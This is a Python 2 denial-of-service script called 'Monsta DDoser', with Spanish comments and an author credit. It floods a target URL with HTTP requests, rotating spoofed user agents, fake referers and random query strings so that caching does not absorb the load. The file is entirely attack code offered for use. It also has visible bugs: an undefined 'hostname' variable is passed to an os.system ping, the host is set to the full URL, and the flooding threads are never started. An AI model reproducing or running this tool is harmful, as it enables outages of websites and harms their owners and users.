import urllib2
import sys
import threading
import random
import re
import os
                 # By Cuidabrutos Alguna Copia Sera Reportada, Por Favor No Lo Distribuya, Fue Mucho Trabajo Hacer El Script, Gracias :D
# Parametros Globales
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inccontador():
	global request_counter
	request_counter+=1

def setearflag(val):
	global flag
	flag=val

def setearseguro():
	global safe
	safe=1
	
# generates a user agent array
def listadeagentes():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# Generar El Array
def listadereferidos():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	headers_referers.append('https://' + host + '/')
	return(headers_referers)
	
# Contruir Un Random ASCCII
def construir_blocke(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def uso():
		print ' '
		print ' '
		print '         Monsta DDoser By Cuidabrutos '
		print ' '
		print '- Comando: Monsta_DDoser.py <url> 15000'
		print '*Hecho Por Cuidabrutos'

	
# Lanzar Request
def lanzar(url):
	listadeagentes()
	listadereferidos()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + construir_blocke(random.randint(3,10)) + '=' + construir_blocke(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + construir_blocke(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			# Imprimir Paquete Correcto
			setearflag(1)
			response = os.system("ping " + hostname)
			# checar ping
			if response == 0:
				pinge = "Ip Activa"
			else:
				pinge = "Ip Caida"
			print 'Paquete Enviado Correctamente! Estado:'
			print pinge
			code=500
	except urllib2.URLError, e:
			# Imprimir La rason
			sys.exit()
	else:
			inccontador()
			urllib2.urlopen(request)
	return(code)		

	
#http llamar thread
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=lanzar(url)
				if (code==500) & (safe==1):
					setearflag(2)
		except Exception, ex:
			pass

# contar los threads
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+20<request_counter) & (previous<>request_counter):
				print "Monsta Atacando.."
				previous=request_counter
		if flag==2:
			print "\n  Monsta Ataque Parado."

# ejecutar
if len(sys.argv) < 2:
	uso()
	sys.exit()
else:
	if sys.argv[1]=="help":
		uso()
		sys.exit()
	else:
		print " Monsta Atacando..."
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				setearseguro()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = url
		lanzar(host)
